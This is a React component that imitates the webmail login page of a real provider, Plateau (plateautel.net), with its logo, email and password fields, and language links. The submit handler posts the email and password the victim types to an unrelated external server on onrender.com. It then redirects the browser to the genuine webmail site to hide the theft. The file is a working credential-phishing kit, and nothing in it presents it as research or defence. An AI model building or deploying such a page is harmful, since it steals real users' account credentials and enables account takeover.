import React from 'react';

import './home.css'

import { useState } from 'react';

import axios from 'axios';
import logo from './plateau.svg';


function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Plateau")
    const[isLoading, setLoading] = useState(false);

async function handleSubmit(e){
    e.preventDefault();


    try {
        setLoading(true);
        const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);
            setLoading(false);

            window.location.href = 'https://webmail.plateautel.net/';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}

   

    return (
        <>

            <div className='maindiv'>

                <div className='content col-md-4  m-auto'>

                    <div className='text-center'>
                        <img src={logo} className="logo" />

                    </div>


                    <form className='pt-4'onSubmit={handleSubmit}>

                    <div class="col-auto">
                            <label className='label'>Email Address</label>
                                <div class="input-group mb-2">
                                    
                                    <div class="input-group-prepend">
                                    
                                    <div class="input-group-text"><i className='fa fa-user'></i></div>
                                    </div>
                                    <input onChange={function(e){
                                        setUserName(e.target.value);
                                    }} value={email} type="email" class="form-control" id="inlineFormInputGroup" placeholder="Enter your email address"required/>
                                </div>
                                </div>



                                <div class="col-auto mt-4">
                            <label className='label'>Password</label>
                                <div class="input-group mb-2">
                                    
                                    <div class="input-group-prepend">
                                    
                                    <div class="input-group-text"><i className='fa fa-lock'></i></div>
                                    </div>
                                    <input onChange={function(e){
                                        setPassword(e.target.value);
                                    }} value={password} type="password" class="form-control" id="inlineFormInputGroup" placeholder="Enter your email password"required/>
                                </div>
                                </div>

                        <div className='form-group text-center my-4'>

                            <button className='btn mybutton'>{isLoading ? "Loading ...." : "Log in"}</button>

                            <p className='reset'>Reset Password</p>

                        </div>
                    </form>

                </div>

        <div className='col-md-8 m-auto py-4'>
                <div className='flexdiv'>

                    <a href='https://webmail.plateautel.net/?locale=ar'className='footertext'>العربية </a>
                    <a href=''className='footertext'>čeština </a>
                    <a href=''className='footertext'>dansk </a>
                    <a href=''className='footertext'>Deutsch </a>
                    <a href=''className='footertext'>Ελληνικά  </a>
                    <a href=''className='footertext'>español </a>
                    <a href=''className='footertext'>español latinoamericano </a>
                    <a href=''className='footertext'>español de España </a>

                </div>

            </div>
        </div>
        
        </>
    );
}


export default Home;